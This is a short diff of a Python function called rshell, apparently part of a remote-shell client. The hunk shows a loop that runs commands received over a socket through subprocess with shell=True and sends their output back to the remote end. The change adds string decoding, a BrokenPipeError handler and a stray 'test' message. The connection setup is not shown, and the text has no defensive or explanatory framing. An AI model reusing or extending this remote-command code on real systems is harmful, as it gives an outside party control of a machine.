@@ -51,14 +51,16 @@ def rshell(s):
         if command.lower() == 'exit':
             break
         output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-        results = output.stdout.read()
-        errors = output.stderr.read()
-        print("RShell results: {}".format(results.decode('utf-8') if results else errors.decode('utf-8')))
-        print("Awaiting ACK.")
-        ack = s.recv(1024)  # Wait for ACK from server
-        print("Received ACK: {}".format(ack.decode('utf-8')))
-        time.sleep(1.5)
-        s.sendall(results if results else errors + b'\n')
+        results = output.stdout.read().decode('utf-8')
+        errors = output.stderr.read().decode('utf-8')
+        print("RShell results: {}".format(results if results else errors))
+        try:
+            s.send(results.encode("utf-8") if results else errors.encode("utf-8"))
+            print("Sent results.")
+            s.sendall("test".encode())
+        except BrokenPipeError:
+            print("Connection closed by server.")
+            break
 
 
 
